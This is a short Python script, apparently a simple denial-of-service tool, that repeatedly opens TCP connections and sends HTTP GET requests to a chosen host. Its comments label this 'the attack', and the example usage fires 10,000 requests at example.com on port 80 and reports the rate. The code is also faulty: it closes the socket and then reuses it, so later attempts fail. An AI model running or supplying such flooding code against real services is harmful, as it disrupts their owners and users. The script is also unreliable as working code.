import socket
import time

def send_packets(target, port, packet_count):
    # Create a socket object
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Get the IP address of the target
    ip = socket.gethostbyname(target)

    # Start the attack
    start_time = time.time()
    for _ in range(packet_count):
        try:
            # Send a packet to the target
            client.connect((ip, port))
            client.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (ip, port))
        except Exception as e:
            print(f"Error: {e}")
        finally:
            client.close()

    end_time = time.time()
    duration = end_time - start_time
    packet_rate = packet_count / duration
    print(f"Sent {packet_count} packets in {duration:.2f} seconds. Packet rate: {packet_rate:.2f} packets per second.")

# Example usage
target = "example.com"
port = 80  # You can change this to 443 for HTTPS
packet_count = 10000  # Number of packets to send

send_packets(target, port, packet_count)